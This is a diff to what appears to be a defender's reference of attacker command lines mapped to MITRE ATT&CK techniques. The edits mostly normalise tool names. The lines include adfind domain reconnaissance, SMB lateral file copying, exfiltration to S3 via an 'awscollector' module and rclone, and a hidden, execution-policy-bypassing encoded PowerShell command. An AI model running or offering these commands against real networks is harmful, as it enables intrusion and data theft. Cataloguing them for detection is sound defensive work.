@@ -66,14 +66,14 @@ setspn [-T REDACTED] -Q cifs/*
 dsquery group -name "<groupname>" | dsget group -members
 Get-MsolUser <user>
 Get-MsolUser -UserPrincipalName <user>
-adfind.exe  -gcb -sc trustdmp 
-adfind.exe  -f "(objectcategory=group)" 
-adfind.exe  -subnets -f (objectCategory=subnet)
-adfind.exe  -f (objectcategory=organizationalUnit) 
-adfind.exe  -f objectcategory=computer -csv name operatingSystem 
-adfind.exe  -f objectcategory=computer 
-adfind.exe  -f (objectcategory=person)
-adexplorer.exe -snapshot
+adfind  -gcb -sc trustdmp 
+adfind  -f "(objectcategory=group)" 
+adfind  -subnets -f (objectCategory=subnet)
+adfind  -f (objectcategory=organizationalUnit) 
+adfind  -f objectcategory=computer -csv name operatingSystem 
+adfind  -f objectcategory=computer 
+adfind  -f (objectcategory=person)
+adexplorer -snapshot
 ```
 <br>
 
@@ -111,8 +111,8 @@ Remote System Discovery [[T1018](https://attack.mitre.org/techniques/T1018/)]
 ```
 cmd /c wmic product get name
 dir \\<ip>\c$\windows\system32\tasks
-ping.exe <domain_name>
-ping.exe <ip_address>
+ping <domain_name>
+ping <ip_address>
 ```
 
 ```
@@ -224,7 +224,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 Lateral Tool Transfer via SMB [[T1570](https://attack.mitre.org/techniques/T1570/)]
 
 ```
-$system32\cmd.exe /C copy * \\<remote_ip>\C$\windows\destination\folder
+cmd.exe /C copy * \\<remote_ip>\C$\windows\destination\folder
 ```
 <br>
 
@@ -453,14 +453,14 @@ Log Enumeration [[T1654](https://attack.mitre.org/techniques/T1654/)]
 
 ```
 get-eventlog security
-powershell -c "get-eventlog 'Security'
+powershell.exe -c "get-eventlog 'Security'
 ```
 <br>
 
 Exfiltration Over Web Service: Exfiltration to Cloud Storage [[T1567.002](https://attack.mitre.org/techniques/T1567/002/)]
 
 ```
-InvokeModule -module awscollector -awskey <key_value> -awssecret <aws_secret> -awss3bucket <domain> -awsregion <region> -handleSystems <target_host>
+powershell.exe InvokeModule -module awscollector -awskey <key_value> -awssecret <aws_secret> -awss3bucket <domain> -awsregion <region> -handleSystems <target_host>
 rclone.exe copy "\\SERVER.domain.name\path"
 ```
 <br>
@@ -537,7 +537,7 @@ netsh advfirewall firewall add rule dir=in name="<name>" program=<file_path> ser
 Obfuscated Files or Information [[T1027](https://attack.mitre.org/techniques/T1027/)]
 
 ```
-PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand <Base64_encoded_string>
+powerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand <Base64_encoded_string>
 ```
 <br>
 
